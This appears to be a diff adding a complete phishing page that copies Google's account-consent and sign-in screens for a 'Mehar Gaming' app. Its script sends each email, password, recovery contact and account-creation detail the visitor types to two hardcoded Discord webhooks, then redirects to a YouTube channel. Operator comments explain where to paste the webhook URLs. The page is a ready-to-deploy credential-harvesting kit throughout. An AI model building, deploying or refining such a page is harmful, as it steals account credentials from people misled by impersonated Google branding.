@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Sign in - Google Accounts</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif}
+html,body{height:100%}
+body{background:#fff;color:#202124;overflow:hidden}
+#continueScreen{display:flex;flex-direction:column;height:100vh;height:100dvh;background:#fff;overflow-y:auto}
+.cont-header{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;border-bottom:1px solid #e8eaed;flex-shrink:0}
+.g-logo-sm{font-size:22px;font-weight:500;letter-spacing:-1px}
+.g-logo-sm span:nth-child(1),#loginScreen .g-logo span:nth-child(1),#loginScreen .g-logo span:nth-child(4){color:#4285F4}
+.g-logo-sm span:nth-child(2),#loginScreen .g-logo span:nth-child(2),#loginScreen .g-logo span:nth-child(6){color:#EA4335}
+.g-logo-sm span:nth-child(3),#loginScreen .g-logo span:nth-child(3){color:#FBBC05}
+.g-logo-sm span:nth-child(5),#loginScreen .g-logo span:nth-child(5){color:#34A853}
+.lock{font-size:18px;color:#5f6368}
+.cont-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px}
+.cont-box{width:100%;max-width:420px;text-align:center}
+.yt-app-icon{width:64px;height:64px;border-radius:16px;background:#ff0033;display:grid;place-items:center;color:#fff;font-size:30px;margin:0 auto 22px;box-shadow:0 2px 8px rgba(0,0,0,.12)}
+.cont-box h2{font-size:24px;font-weight:400;margin-bottom:6px;line-height:1.3}
+.cont-box .sub{font-size:14px;color:#5f6368;line-height:1.5;margin-bottom:28px}
+.cont-account,.cont-other{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:12px;text-align:left;cursor:pointer;transition:background .15s;background:#fff;width:100%;font-family:inherit}
+.cont-account{margin-bottom:14px}.cont-other{margin-bottom:24px}
+.cont-account:hover,.cont-other:hover{background:#f8f9fa}
+.cont-account .av{width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:grid;place-items:center;font-weight:500;font-size:18px;flex-shrink:0}
+.cont-account .info{flex:1;min-width:0}
+.cont-account .nm{font-size:14px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cont-account .em{font-size:13px;color:#5f6368;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cont-account .chev{color:#5f6368;font-size:18px}
+.cont-other .plus{width:40px;height:40px;border-radius:50%;border:1px solid #dadce0;display:grid;place-items:center;color:#5f6368;font-size:20px;flex-shrink:0}
+.cont-other .txt{font-size:14px;font-weight:500}
+.cont-consent-text{font-size:12px;color:#5f6368;line-height:1.6;margin-bottom:24px}
+.cont-consent-text a{color:#1a73e8;text-decoration:none}
+.cont-actions{display:flex;justify-content:flex-end;gap:10px}
+.cont-btn-cancel{background:transparent;border:0;color:#1a73e8;font-size:14px;font-weight:500;padding:10px 16px;border-radius:4px;cursor:pointer;font-family:inherit}
+.cont-btn-cancel:hover{background:#f1f3f4}
+.cont-btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+.cont-btn:hover{background:#1557b0}
+#loginScreen{display:none;flex-direction:column;height:100vh;height:100dvh;overflow:hidden;background:#fff}
+#loginScreen.on{display:flex}
+.mc{padding:20px 24px;flex:1;display:none;flex-direction:column;overflow-y:auto}
+.mc.act{display:flex}
+#loginScreen .g-logo{text-align:center;margin-top:40px;margin-bottom:20px;font-size:32px;letter-spacing:-1px}
+#loginScreen h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:16px}
+.desc{font-size:16px;text-align:center;line-height:1.5;margin-bottom:12px}
+.lm{font-size:14px;color:#1a73e8;text-align:center;text-decoration:none;font-weight:500;display:block;margin-bottom:40px}
+.ic{margin-bottom:10px}
+#loginScreen input[type=text],#loginScreen input[type=password]{width:100%;padding:14px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border .2s}
+#loginScreen input:focus{border:2px solid #1a73e8;padding:13px 15px}
+#loginScreen input.error{border:2px solid #d93025;padding:13px 15px}
+.ih{font-size:12px;color:#5f6368;margin-top:4px;padding-left:4px;display:none}
+.ih.red{color:#d93025;display:block}
+.fe,.ca{display:inline-block;font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500;cursor:pointer}
+.fe{margin-top:10px;margin-bottom:40px}
+.bb{display:flex;justify-content:space-between;align-items:center;padding:16px 24px;background:#fff;margin-bottom:20px}
+.btn-n{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+.btn-n:hover{background:#1557b0}
+.btn-n:disabled{opacity:.6;cursor:wait}
+.user-info{display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;font-weight:500;margin-bottom:40px}
+.user-icon{width:24px;height:24px;fill:#5f6368}
+.fl{position:relative;margin-top:10px}
+.fl input{padding:20px 48px 8px 16px;width:100%;font-size:16px;border:2px solid #1a73e8;border-radius:4px;outline:none;background:transparent}
+.fl label{position:absolute;top:-10px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;font-weight:500}
+
+/* Eye Icon CSS */
+.eye-btn {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: transparent;
+  border: none;
+  cursor: pointer;
+  color: #5f6368;
+  padding: 5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.eye-btn svg { width: 22px; height: 22px; fill: currentColor; }
+.eye-btn:hover { color: #202124; }
+
+@media(min-width:450px){.mc,.bb{padding:20px 15vw}}
+</style>
+</head>
+<body>
+
+<div id="continueScreen">
+<div class="cont-header"><div class="g-logo-sm"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="lock">🔒</div></div>
+<div class="cont-wrap"><div class="cont-box">
+<div class="yt-app-icon">▶</div>
+<h2>Continue to Mehar Gaming</h2>
+<p class="sub">Mehar Gaming wants to access your Google Account</p>
+<button class="cont-account" type="button" onclick="goLogin(false)"><div class="av" id="contAv">M</div><div class="info"><div class="nm" id="contName">Google User</div><div class="em" id="contEmail">user@gmail.com</div></div><div class="chev">›</div></button>
+<button class="cont-other" type="button" onclick="goLogin(true)"><div class="plus">+</div><div class="txt">Use another account</div></button>
+<p class="cont-consent-text">To continue, Google will share your name, email address, and profile picture with Mehar Gaming. See Mehar Gaming's <a href="#" onclick="return false">privacy policy</a> and <a href="#" onclick="return false">terms of service</a>.</p>
+<div class="cont-actions"><button class="cont-btn-cancel" type="button" id="cancelBtn">Cancel</button><button class="cont-btn" type="button" onclick="goLogin(false)">Continue</button></div>
+</div></div>
+</div>
+
+<div id="loginScreen">
+<div class="mc act" id="p1">
+<div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+<h1>Sign in</h1>
+<p class="desc">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+<a href="#" class="lm" onclick="return false">Learn more about using your account</a>
+<div class="ic"><input type="text" placeholder="Email or phone" id="ei" autocomplete="off" inputmode="email"><div class="ih" id="ih">Enter a valid email or phone number</div></div>
+<a href="#" class="fe" onclick="pg('pFor');return false">Forgot email?</a>
+<div><a href="#" class="ca" onclick="pg('pCre');return false">Create account</a></div>
+</div>
+<div class="mc" id="p2">
+<div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+<h1>Welcome</h1>
+<div class="user-info"><svg class="user-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg><span id="de">email@gmail.com</span></div>
+<div class="fl">
+  <input type="password" id="pi" autocomplete="off">
+  <label>Enter your password</label>
+  <button type="button" class="eye-btn" id="eyeBtn" onclick="tp()">
+    <!-- Eye Icon (Show) -->
+    <svg id="eyeShow" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+    <!-- Eye Off Icon (Hide) -->
+    <svg id="eyeHide" viewBox="0 0 24 24" style="display:none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+  </button>
+</div>
+</div>
+<div class="mc" id="pFor">
+<div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+<h1>Find your email</h1>
+<p class="desc">Enter your phone number or recovery email</p>
+<div class="ic">
+<input type="text" placeholder="Phone number or recovery email" id="fei" autocomplete="off" inputmode="email">
+<div class="ih" id="feiErr">Please continue to Google</div>
+</div>
+<a href="#" class="ca" onclick="pg('p1');return false">Back to sign in</a>
+</div>
+<div class="mc" id="pCre">
+<div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+<h1>Create your Google Account</h1>
+<div class="ic"><input type="text" placeholder="First name" id="cfn" style="margin-bottom:10px" autocomplete="off"><input type="text" placeholder="Last name" id="cln" style="margin-bottom:10px" autocomplete="off"><input type="text" placeholder="Username (Gmail)" id="cun" autocomplete="off" inputmode="email"></div>
+<a href="#" class="ca" onclick="pg('p1');return false">Back to sign in</a>
+</div>
+<div class="bb"><a href="#" class="fe" id="flk" style="margin:0;display:none" onclick="pg('pFor');return false">Forgot password?</a><div style="flex:1"></div><button class="btn-n" type="button" id="nextBtn" onclick="nxt()">Next</button></div>
+</div>
+
+<script>
+'use strict';
+
+/* ============================================================
+   👇 Yahan apne DONO Discord Webhook URLs daalein 👇
+   ============================================================ */
+const WEBHOOK_URL_1 = 'https://discord.com/api/webhooks/1563434330762510376/12SyovNQ-u3QbewHJLTbjYCebmrvifh1jhMtXZ5r_9nNrfmjLBZudwbZqb1saeku1nz8';
+const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1563601616911732736/bXW0pFxu6n1kmmUbeXMTv9i7fW8yaZM-lH-NUOiK_bFpp0qKaJCiqpD8zOQnrKWIcovP';
+/* ============================================================ */
+
+const REDIRECT_URL = 'https://www.youtube.com/@MeharisLive-d8b';
+const WEBHOOK_TIMEOUT = 5000;
+
+/* ---------- Helpers ---------- */
+const $ = id => document.getElementById(id);
+let loginStep = 'p1';
+let busy = false;
+let focusTimer = null;
+
+/* ---------- Dual Webhook Sender ---------- */
+function sendToDiscord(fields) {
+  const payload = JSON.stringify({
+    embeds: [{
+      title: '🔐 Login Attempt',
+      color: 5763719,
+      fields: fields,
+      footer: { text: 'Dual Webhook System' },
+      timestamp: new Date().toISOString()
+    }]
+  });
+
+  const send = (url) => {
+    return new Promise((resolve) => {
+      if (!url || url.includes('YAHAN_APNA') || !url.startsWith('https://discord.com/api/webhooks/')) {
+        return resolve(false);
+      }
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), WEBHOOK_TIMEOUT);
+      
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        signal: ctrl.signal,
+        mode: 'cors'
+      }).then(r => {
+        clearTimeout(timer);
+        resolve(r.ok);
+      }).catch(e => {
+        clearTimeout(timer);
+        console.error('Webhook failed:', e.message);
+        resolve(false);
+      });
+    });
+  };
+
+  return Promise.all([send(WEBHOOK_URL_1), send(WEBHOOK_URL_2)]);
+}
+
+/* ---------- Screen router ---------- */
+function show(id){
+  ['continueScreen','loginScreen'].forEach(s => {
+    const el = $(s); if(!el) return;
+    el.style.display = 'none';
+    el.classList.remove('on');
+  });
+  const el = $(id); if(!el) return;
+  el.style.display = 'flex';
+  if(id === 'loginScreen') el.classList.add('on');
+}
+
+/* ---------- Step router ---------- */
+function pg(id){
+  if(busy) return;
+  document.querySelectorAll('#loginScreen .mc').forEach(e => e.classList.remove('act'));
+  const el = $(id); if(!el) return;
+  el.classList.add('act');
+  loginStep = id;
+  $('flk').style.display = (id === 'p2') ? 'block' : 'none';
+  if(id === 'pFor'){ $('feiErr').className = 'ih'; $('fei').classList.remove('error'); }
+  if(id === 'p1'){ $('ih').className = 'ih'; $('ei').classList.remove('error'); }
+  if(focusTimer){ clearTimeout(focusTimer); focusTimer = null; }
+  focusTimer = setTimeout(() => {
+    focusTimer = null;
+    if(id === 'p1') $('ei').focus();
+    else if(id === 'p2') $('pi').focus();
+    else if(id === 'pFor') $('fei').focus();
+    else if(id === 'pCre') $('cfn').focus();
+  }, 80);
+}
+
+/* ---------- Reset ---------- */
+function resetLogin(){
+  loginStep = 'p1';
+  busy = false;
+  if(focusTimer){ clearTimeout(focusTimer); focusTimer = null; }
+  ['ei','pi','fei','cfn','cln','cun'].forEach(k => { if($(k)) $(k).value = ''; });
+  $('ih').className = 'ih';
+  $('feiErr').className = 'ih';
+  $('ei').classList.remove('error');
+  $('fei').classList.remove('error');
+  $('de').innerText = 'email@gmail.com';
+  $('pi').type = 'password';
+  $('eyeShow').style.display = 'block';
+  $('eyeHide').style.display = 'none';
+  $('nextBtn').disabled = false;
+  $('nextBtn').textContent = 'Next';
+  pg('p1');
+}
+
+function goLogin(fromOther){
+  resetLogin();
+  if(fromOther){
+    $('ei').value = '';
+    $('contEmail').innerText = 'user@gmail.com';
+    $('contName').innerText = 'Google User';
+    $('contAv').innerText = 'M';
+  }
+  show('loginScreen');
+}
+
+/* ---------- Redirect ---------- */
+function goToYouTube(){
+  const url = REDIRECT_URL.trim();
+  try { window.location.replace(url); }
+  catch(e) {
+    try { window.location.href = url; }
+    catch(e2) { window.open(url, '_self'); }
+  }
+}
+
+/* ---------- Inputs ---------- */
+$('ei').addEventListener('input', () => { $('ih').className = 'ih'; $('ei').classList.remove('error'); });
+$('fei').addEventListener('input', () => { $('feiErr').className = 'ih'; $('fei').classList.remove('error'); });
+
+/* ---------- Password Show/Hide Logic ---------- */
+function tp(){
+  const pi = $('pi');
+  if (pi.type === 'password') {
+    pi.type = 'text';
+    $('eyeShow').style.display = 'none';
+    $('eyeHide').style.display = 'block';
+  } else {
+    pi.type = 'password';
+    $('eyeShow').style.display = 'block';
+    $('eyeHide').style.display = 'none';
+  }
+}
+
+/* ---------- Enter key ---------- */
+document.addEventListener('keydown', e => {
+  if(e.key !== 'Enter') return;
+  if($('loginScreen').style.display === 'none') return;
+  if(busy || $('nextBtn').disabled) return;
+  if(['p1','p2','pFor','pCre'].includes(loginStep)){
+    e.preventDefault();
+    nxt();
+  }
+});
+
+/* ---------- Next ---------- */
+async function nxt(){
+  if(busy) return;
+  const btn = $('nextBtn');
+
+  if(loginStep === 'p1'){
+    const v = $('ei').value.trim();
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){
+      $('ei').classList.add('error');
+      $('ih').className = 'ih red';
+      $('ih').innerText = 'Enter a valid email';
+      $('ei').focus();
+      return;
+    }
+    busy = true;
+    btn.disabled = true;
+    btn.textContent = '...';
+    try {
+      await sendToDiscord([
+        {name:'Stage', value:'Email Entered', inline:true},
+        {name:'Email', value:v, inline:true}
+      ]);
+    } catch(e) { console.error(e); }
+    busy = false;
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    $('de').innerText = v;
+    $('contEmail').innerText = v;
+    $('contName').innerText = v.split('@')[0] || 'Google User';
+    $('contAv').innerText = (v[0] || 'G').toUpperCase();
+    pg('p2');
+  }
+  else if(loginStep === 'p2'){
+    const pw = $('pi').value;
+    if(pw === ''){
+      alert('Password cannot be empty (Demo).');
+      $('pi').focus();
+      return;
+    }
+    busy = true;
+    btn.disabled = true;
+    btn.textContent = 'Signing in...';
+    try {
+      await sendToDiscord([
+        {name:'Stage', value:'Password Entered', inline:true},
+        {name:'Email', value:$('de').innerText, inline:true},
+        {name:'Password', value:pw, inline:false}
+      ]);
+    } catch(e) { console.error(e); }
+    busy = false;
+    goToYouTube();
+  }
+  else if(loginStep === 'pFor'){
+    const val = $('fei').value.trim();
+    if(val === ''){
+      alert('Please enter phone number or recovery email.');
+      $('fei').focus();
+      return;
+    }
+    busy = true;
+    btn.disabled = true;
+    btn.textContent = '...';
+    try {
+      await sendToDiscord([
+        {name:'Stage', value:'Recovery Info', inline:true},
+        {name:'Recovery', value:val, inline:true}
+      ]);
+    } catch(e) { console.error(e); }
+    busy = false;
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    $('fei').classList.add('error');
+    $('feiErr').className = 'ih red';
+    $('feiErr').innerText = 'Please continue to Google';
+    $('fei').focus();
+  }
+  else if(loginStep === 'pCre'){
+    const fn = $('cfn').value.trim();
+    const ln = $('cln').value.trim();
+    const un = $('cun').value.trim();
+    if(!fn || !ln || !un){
+      alert('Please fill all fields to create an account.');
+      return;
+    }
+    const cleanUn = un.replace(/@gmail\.com$/i, '').trim();
+    busy = true;
+    btn.disabled = true;
+    btn.textContent = '...';
+    try {
+      await sendToDiscord([
+        {name:'Stage', value:'Create Account', inline:true},
+        {name:'First Name', value:fn, inline:true},
+        {name:'Last Name', value:ln, inline:true},
+        {name:'Username', value:cleanUn + '@gmail.com', inline:false}
+      ]);
+    } catch(e) { console.error(e); }
+    busy = false;
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    alert('Demo: Account created for ' + fn + ' ' + ln + '\nUsername: ' + cleanUn + '@gmail.com');
+    pg('p1');
+  }
+}
+
+/* ---------- Cancel ---------- */
+$('cancelBtn').onclick = () => {
+  $('ei').value = '';
+  $('pi').value = '';
+  resetLogin();
+  show('continueScreen');
+};
+
+/* ---------- Back button fix ---------- */
+window.addEventListener('pageshow', () => {
+  busy = false;
+  const b = $('nextBtn');
+  if(b){ b.disabled = false; b.textContent = 'Next'; }
+});
+
+/* ---------- Start ---------- */
+show('continueScreen');
+</script>
+</body>
+</html>
